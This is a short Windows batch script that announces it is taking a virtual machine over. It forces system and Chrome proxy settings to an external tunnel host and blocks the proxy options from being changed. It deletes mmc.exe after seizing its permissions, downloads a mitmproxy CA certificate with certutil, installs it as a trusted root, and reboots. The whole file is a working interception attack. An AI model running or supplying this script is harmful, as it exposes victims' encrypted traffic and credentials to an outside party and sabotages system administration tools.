@echo off
echo Taking the vm over....
timeout 1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "bore.pub:57698" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyOverride /t REG_SZ /d "<local>" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoDetect /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v Proxy /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v ConnectionsTab /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Google\Chrome" /v ProxyMode /t REG_SZ /d system /f

takeown /f C:\Windows\System32\mmc.exe
icacls C:\Windows\System32\mmc.exe /grant everyone:F
del /Q C:\Windows\System32\mmc.exe

certutil -urlcache -f http://mitm.it/cert/cer ca.cer
certutil -addstore -f "Root" ca.cer

timeout 5

shutdown /r /t 0
